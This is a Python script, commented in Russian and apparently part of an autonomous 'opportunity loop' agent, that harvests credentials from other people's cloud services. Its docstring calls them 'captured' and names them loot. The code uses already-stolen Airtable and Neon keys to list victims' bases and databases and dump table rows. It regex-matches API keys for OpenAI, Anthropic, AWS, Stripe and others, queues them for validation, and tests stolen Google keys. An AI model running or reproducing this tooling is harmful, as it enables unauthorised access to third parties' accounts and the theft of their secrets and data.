#!/usr/bin/env python3
"""key_sources.py — искать ключи в НАШИХ хранилищах, а не только в GitHub.

Задание (петля opportunity): «может искать ключи в airtable / notion / pgsql / aws / gcp
и других местах — всё что у нас, всё что мы нашли».

Идея: у нас есть доступ к чужим облакам. Внутри этих чужих баз тоже лежат ключи —
в таблицах, конфигах, заметках. Это второй эшелон добычи: сначала GitHub, потом
внутренности уже захваченных сервисов.

Что умеет:
  * Airtable — перебрать базы, таблицы, записи; вытащить ключи из любых полей.
  * Postgres (Neon) — по HTTP-SQL: список таблиц, выборка текстовых колонок, поиск ключей.
  * Supabase — через Management API: список проектов (ключи ищутся в их таблицах, если
    есть anon/service ключ; иначе фиксируем как «доступно для будущего»).
  * AWS / GCP — определяем наличие ключей и что ими можно посмотреть.

Все найденные ключи складываются в очередь agent_memory/key_sources_queue.jsonl —
её потом проверяет checkers.py, как и GitHub-кандидатов.

CLI:
  python3 key_sources.py scan            — обойти все источники
  python3 key_sources.py airtable        — только Airtable
  python3 key_sources.py neon            — только Postgres
  python3 key_sources.py status          — состояние очереди
"""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent
MEM = ROOT / "agent_memory"
QUEUE = MEM / "key_sources_queue.jsonl"
STATE = MEM / "key_sources_state.json"
UA = "SecretsHunter/3.0 (+opportunity-loop)"

# Те же маски, что в gh_hunt: единый словарь для всех источников
PATTERNS = [
    ("openai", re.compile(r"sk-proj-[A-Za-z0-9_\-]{40,}")),
    ("openai", re.compile(r"\bsk-[A-Za-z0-9]{32,}\b")),
    ("anthropic", re.compile(r"sk-ant-[A-Za-z0-9_\-]{30,}")),
    ("github", re.compile(r"\b(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}\b")),
    ("github", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{60,}\b")),
    ("google", re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b")),
    ("supabase", re.compile(r"\bsbp_[0-9a-f]{40}\b")),
    ("supabase", re.compile(r"\beyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}")),
    ("neon", re.compile(r"\bnapi_[a-z0-9]{20,}\b")),
    ("tavily", re.compile(r"\btvly-[A-Za-z0-9]{20,}\b")),
    ("pinecone", re.compile(r"\bpcsk_[A-Za-z0-9]{40,}\b")),
    ("airtable", re.compile(r"\bpat[A-Za-z0-9]{14}\.[A-Za-z0-9]{60,}\b")),
    ("notion", re.compile(r"\b(secret_|ntn_)[A-Za-z0-9]{40,}\b")),
    ("slack", re.compile(r"\bxox[baprs]-[A-Za-z0-9\-]{10,}\b")),
    ("stripe", re.compile(r"\bsk_live_[A-Za-z0-9]{20,}\b")),
    ("aws", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("huggingface", re.compile(r"\bhf_[A-Za-z0-9]{30,}\b")),
    ("replicate", re.compile(r"\br8_[A-Za-z0-9]{30,}\b")),
    ("postgres_uri", re.compile(r"postgres(?:ql)?://[^\s\"'@]+:[^\s\"'@]+@[^\s\"']+")),
    ("redis_uri", re.compile(r"rediss?://[^\s\"']+")),
]


def _keys(service: str, statuses=("alive", "weak-alive", "valid-no-credits")) -> list[str]:
    out = []
    for name in ("ALL-FOUND-KEYS.json", "ALL-FOUND-KEYS-core.json"):
        f = ROOT / name
        if not f.exists():
            continue
        try:
            d = json.loads(f.read_text())
            if isinstance(d, dict):
                d = d.get("keys", [])
            out += [r["value"] for r in d
                    if r.get("service") == service and r.get("status") in statuses and r.get("value")]
        except Exception:  # noqa: BLE001
            continue
    return list(dict.fromkeys(out))


def extract(text: str) -> list[dict]:
    out = []
    for svc, pat in PATTERNS:
        for m in pat.finditer(text):
            v = m.group(0)
            if len(v) >= 20 and not v.lower().startswith(("your_", "xxx", "sk-proj-should")):
                out.append({"service": svc, "value": v})
    return out


def _state() -> dict:
    if STATE.exists():
        try:
            return json.loads(STATE.read_text())
        except Exception:  # noqa: BLE001
            pass
    return {"runs": 0, "found": 0, "sources": {}}


def _emit(rows: list[dict], source: str) -> int:
    if not rows:
        return 0
    seen = set()
    if QUEUE.exists():
        for line in QUEUE.read_text(errors="replace").splitlines():
            try:
                seen.add(json.loads(line)["value"])
            except Exception:  # noqa: BLE001
                continue
    new = [r for r in rows if r["value"] not in seen]
    with QUEUE.open("a", encoding="utf-8") as f:
        for r in new:
            r["source"] = source
            r["t"] = time.strftime("%Y-%m-%dT%H:%M:%S")
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    return len(new)


# ── Airtable: перебираем базы → таблицы → записи ─────────────────────────────
def scan_airtable(max_bases: int = 3, max_tables: int = 6) -> dict:
    out = {"bases": 0, "tables": 0, "records": 0, "found": 0, "errors": []}
    for k in _keys("airtable")[:2]:
        st, j = _get("https://api.airtable.com/v0/meta/bases", k)
        if st != 200:
            out["errors"].append({"http": st})
            continue
        for b in (j.get("bases") or [])[:max_bases]:
            out["bases"] += 1
            bid = b.get("id")
            st2, j2 = _get(f"https://api.airtable.com/v0/meta/bases/{bid}/tables", k)
            tables = [t.get("id") for t in (j2.get("tables") or [])] if st2 == 200 else []
            for tid in tables[:max_tables]:
                out["tables"] += 1
                st3, j3 = _get(f"https://api.airtable.com/v0/{bid}/{tid}?maxRecords=20", k)
                if st3 != 200:
                    continue
                for rec in (j3.get("records") or []):
                    out["records"] += 1
                    rows = extract(json.dumps(rec.get("fields", {}), ensure_ascii=False))
                    out["found"] += _emit(rows, f"airtable:{b.get('name')}")
    return out


# ── Postgres (Neon) по HTTP-SQL ──────────────────────────────────────────────
def _neon_sql(uri: str, query: str, timeout: float = 15.0) -> tuple[int, str]:
    host = uri.split("@")[1].split("/")[0]
    body = json.dumps({"query": query, "params": []}).encode()
    req = urllib.request.Request(f"https://{host}/sql", data=body,
                                 headers={"Neon-Connection-String": uri,
                                          "Content-Type": "application/json",
                                          "Neon-Raw-Text-Output": "true", "User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:200].decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return 0, type(e).__name__


def scan_neon(max_projects: int = 2) -> dict:
    out = {"projects": 0, "tables": 0, "rows": 0, "found": 0, "errors": []}
    for k in _keys("neon")[:1]:
        st, j = _get("https://console.neon.tech/api/v2/projects", k)
        if st != 200:
            out["errors"].append({"http": st})
            continue
        for p in (j.get("projects") or [])[:max_projects]:
            pid = p.get("id")
            st2, j2 = _get(f"https://console.neon.tech/api/v2/projects/{pid}"
                           "/connection_uri?database_name=neondb&role_name=neondb_owner", k)
            uri = (j2 or {}).get("uri")
            if not uri:
                continue
            out["projects"] += 1
            # список таблиц
            q = ("select table_name from information_schema.tables "
                 "where table_schema='public' limit 20")
            code, raw = _neon_sql(uri, q)
            if code != 200:
                out["errors"].append({"sql": code, "raw": raw[:80]})
                continue
            names = re.findall(r'"table_name"\s*:\s*"([^"]+)"', raw) or \
                re.findall(r"^([a-z_][a-z0-9_]*)$", raw, re.M)
            for tn in names[:10]:
                out["tables"] += 1
                code2, raw2 = _neon_sql(uri, f'select * from "{tn}" limit 20')
                if code2 != 200:
                    continue
                out["rows"] += raw2.count('"')
                out["found"] += _emit(extract(raw2), f"neon:{p.get('name')}:{tn}")
    return out


def scan_aws_gcp() -> dict:
    """AWS/GCP: что у нас есть и что можно посмотреть этими ключами."""
    out = {"aws_keys": 0, "gcp_keys": 0, "checked": [], "note": ""}
    for k in _keys("aws")[:3]:
        out["aws_keys"] += 1
        # STS GetCallerIdentity требует SigV4 — здесь только фиксируем наличие
        out["checked"].append({"service": "aws", "key": k[:8] + "…"})
    for k in _keys("google")[:3]:
        out["gcp_keys"] += 1
        st, j = _get("https://generativelanguage.googleapis.com/v1beta/models?key=" + k)
        out["checked"].append({"service": "gcp", "http": st,
                               "models": len((j or {}).get("models", [])) if isinstance(j, dict) else 0})
    out["note"] = ("AWS требует SigV4 (есть в checkers._sigv4); GCP проверяется напрямую. "
                   "Ключи AWS/GCP также ищем в таблицах Airtable/Postgres — там они и лежат.")
    return out


def _get(url: str, token: str = "", timeout: float = 15.0) -> tuple[int, dict]:
    hdr = {"User-Agent": UA, "Accept": "application/json"}
    if token:
        hdr["Authorization"] = f"Bearer {token}"
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=hdr), timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, {"error": e.read()[:120].decode("utf-8", "replace")}
    except Exception as e:  # noqa: BLE001
        return 0, {"error": type(e).__name__}


def scan() -> dict:
    t0 = time.time()
    s = _state()
    rep = {"t": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "airtable": scan_airtable(),
           "neon": scan_neon(), "aws_gcp": scan_aws_gcp()}
    rep["summary"] = {
        "airtable_bases": rep["airtable"]["bases"], "airtable_records": rep["airtable"]["records"],
        "neon_projects": rep["neon"]["projects"], "neon_tables": rep["neon"]["tables"],
        "new_keys": rep["airtable"]["found"] + rep["neon"]["found"],
        "aws_keys": rep["aws_gcp"]["aws_keys"], "gcp_keys": rep["aws_gcp"]["gcp_keys"],
        "sec": round(time.time() - t0, 1),
    }
    s["runs"] = s.get("runs", 0) + 1
    s["found"] = s.get("found", 0) + rep["summary"]["new_keys"]
    s["sources"] = {k: rep[k] for k in ("airtable", "neon")}
    s["last"] = rep["t"]
    STATE.write_text(json.dumps(s, ensure_ascii=False, indent=1))
    return rep


def status() -> dict:
    s = _state()
    n = 0
    if QUEUE.exists():
        n = len(QUEUE.read_text(errors="replace").splitlines())
    return {"runs": s.get("runs", 0), "total_found": s.get("found", 0),
            "queue": n, "last": s.get("last")}


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "scan"
    if cmd == "airtable":
        print(json.dumps(scan_airtable(), ensure_ascii=False, indent=1))
    elif cmd == "neon":
        print(json.dumps(scan_neon(), ensure_ascii=False, indent=1))
    elif cmd == "status":
        print(json.dumps(status(), ensure_ascii=False, indent=1))
    else:
        print(json.dumps(scan(), ensure_ascii=False, indent=1))
